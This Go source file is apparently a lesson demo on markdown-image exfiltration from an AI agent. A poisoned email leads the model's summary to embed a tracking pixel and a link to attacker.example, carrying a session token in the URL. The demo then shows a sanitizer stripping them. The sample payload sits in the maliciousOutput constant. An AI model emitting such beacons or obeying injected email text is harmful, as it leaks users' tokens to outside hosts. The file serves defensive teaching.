// Command main is the runnable demo for lesson 05.3, the tracking pixel.
//
// Run it with:
//
//	go run .
//
// The agent shows the user a summary in a web page, rendered from markdown the
// model produced. A markdown image in that output is a tracking pixel: the browser
// fetches it on load, with no click, and its URL can carry data out. This demo
// hands a poisoned summary to the page as-is and finds the beacon in what the
// browser would render, then sanitizes the model output first and finds it gone.
// Deterministic, no model.
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/t0ul/emaildrop/pkg/controlplane"
)

const attackerHost = "attacker.example"

// maliciousOutput is the summary the model produced after reading a poisoned email:
// a normal report with a tracking pixel and an auto-fetching link smuggled in.
const maliciousOutput = `# Weekly summary

You are all caught up for this week.

![Data Sync](http://attacker.example/log?d=SESSION-TOKEN-9)

More detail at <http://attacker.example/report>.
`

func main() {
	leaked := renderedRaw()
	blocked := sanitizedFirst()

	fmt.Println()
	if leaked && blocked {
		fmt.Println("attack blocked (the receipt): the pixel reaches the browser raw, stripped once the output is sanitized")
	} else {
		fmt.Println("a control did not hold")
		os.Exit(1)
	}
}

// ---- before: hand the model output straight to the page ----

func renderedRaw() bool {
	fmt.Println("== before: the model output goes straight to the page ==")
	toBrowser := maliciousOutput
	fmt.Printf("  the page receives: %s\n", oneLine(firstImageLine(toBrowser)))
	present := strings.Contains(toBrowser, attackerHost)
	fmt.Printf("  the beacon host %q reaches the browser: %v (it fetches on page load)\n", attackerHost, present)
	return present
}

// ---- after: sanitize the model output first ----

func sanitizedFirst() bool {
	fmt.Println("\n== after: sanitize the model output first ==")
	clean, removed := controlplane.SanitizeMarkdown(maliciousOutput)
	fmt.Printf("  the page receives: %s\n", oneLine(firstImageLine(clean)))
	present := strings.Contains(clean, attackerHost)
	fmt.Printf("  image/link tags removed: %d; the beacon host reaches the browser: %v\n", removed, present)
	return !present
}

func firstImageLine(md string) string {
	for _, l := range strings.Split(md, "\n") {
		if strings.Contains(l, "BLOCKED") || strings.Contains(l, "![") || strings.Contains(l, "<http") {
			return l
		}
	}
	return "(no image)"
}

func oneLine(s string) string { return strings.TrimSpace(s) }
